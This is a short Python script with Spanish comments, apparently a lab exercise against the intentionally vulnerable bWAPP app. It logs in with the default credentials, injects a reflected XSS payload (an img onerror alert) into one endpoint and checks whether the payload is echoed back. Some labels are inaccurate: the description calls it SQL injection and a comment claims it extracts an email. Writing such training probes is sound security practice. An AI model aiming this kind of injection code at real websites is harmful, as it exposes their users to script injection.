import requests
import urllib
import argparse

user = "bee"
password = "bug"

##Función que realiza una conexión al sitio vulnerable de acuerdo a la IP, usuario y password.
##Se reconoce si las credenciales son correctas de acuerdo al mensaje de respuesta recibido. 
##Se agrega control de errores.
def Autenticacion(ip, user, password):
    s = requests.Session()
    data = {"login":user, "password": password, "security_level":"0","form":"submit"}
    urlLogin = f"http://{ip}/bWAPP/login.php"
    try:
        req = s.post(urlLogin, data=data, allow_redirects=True)
    except Exception as e:
        print(f"Error al conectar con el host: {e}")
        exit()
    #validar mediante un mensaje de la respuesta que la autenticación fue exitosa
    print('Probando credenciales: '+user +':' +password)
    if "or a buggy web application" in req.text:
        print("¡¡¡¡¡¡¡¡Ingreso exitoso!!!!!!!!")
        # inyección XSS Reflejada (AJAX/JSON)
        xss(s,ip)
    elif "Invalid credentials or user not activated" in req.text:
        print("Invalid credentials")
    else:
        print("Hubo un problema")

##XSS Injection
##realiza una inyección XSS y busca una respuesta HTTP 200 con la inyección reflejada. 
##La inyección XSS se realiza en la URL sobre el endpoint vulnerable.
def xss(s,ip):
    #inyección que busca el mail del usuario bee
    payload="<img src=x onerror=alert('holahola')>"
    payload_enc = urllib.parse.quote_plus(payload)
    url = f"http://{ip}//bWAPP/xss_ajax_2-2.php?title={payload}"
    cookie = {'PHPSESSID':'e35379fb274f685034d95003c9a8db88', 'security_level':'0'}
    r = s.get(url, cookies=cookie)
    if payload in r.text and r.status_code == 200:
        print("[+] - XSS encontrado!!!!", payload)
        print("[+] - Endoint vulnerable:" +url)
    else:
        print("No se pudo encontrar inyección XSS")

##En la función principal se controlan los argumentos recibidos y se hace la Autenticación de acuerdo al usuario y contraseña configurado.
def main():
    parser = argparse.ArgumentParser(description='SQLi en bWAPP')
    parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
    args = parser.parse_args()

    print("[+] - Iniciando")
    Autenticacion(args.ip, user, password)
    print("[+] - Finalizado")
if __name__ == "__main__":
    main()
